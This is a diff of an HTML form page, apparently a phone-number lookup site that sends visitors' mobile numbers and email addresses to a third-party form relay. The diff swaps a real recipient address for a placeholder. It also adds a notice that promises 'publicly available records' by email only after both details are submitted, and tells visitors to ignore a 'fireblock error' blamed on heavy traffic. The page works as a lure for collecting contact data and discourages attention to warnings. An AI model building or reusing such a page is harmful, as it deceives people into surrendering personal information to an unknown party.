@@ -18,7 +18,7 @@
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      width: 320px;
+      width: 350px;
     }
     input[type="text"], input[type="email"] {
       width: 100%;
@@ -42,15 +42,28 @@
       font-weight: bold;
       display: none;
     }
+    .note {
+      font-size: 14px;
+      background-color: #fff8dc;
+      border-left: 4px solid #ffa500;
+      padding: 10px;
+      margin-bottom: 20px;
+      color: #444;
+    }
   </style>
 </head>
 <body>
-  <form action="https://formsubmit.co/thesecrec@proton.me" method="POST" onsubmit="showMessage()">
+  <form action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST" onsubmit="showMessage()">
     <h2>Enter Details</h2>
-    <input type="text" name="phone_number" placeholder="Enter mobile number" required />
-    <input type="email" name="user_email" placeholder="Enter your email" required />
 
-    <!-- Optional: redirect to a thank-you page -->
+    <div class="note">
+      📢 <strong>Note:</strong> You will receive publicly available records only.  
+      This website does not share results here — we will send details only after you submit your email address along with the number. Due to heavey traffic you see fireblock error, please ignore
+    </div>
+
+    <input type="text" name="phone_number" placeholder="Enter mobile number" required />
+    <input type="email" name="user_email" placeholder="Enter your email address" required />
+
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_next" value="https://yourdomain.com/thanks.html" />
 
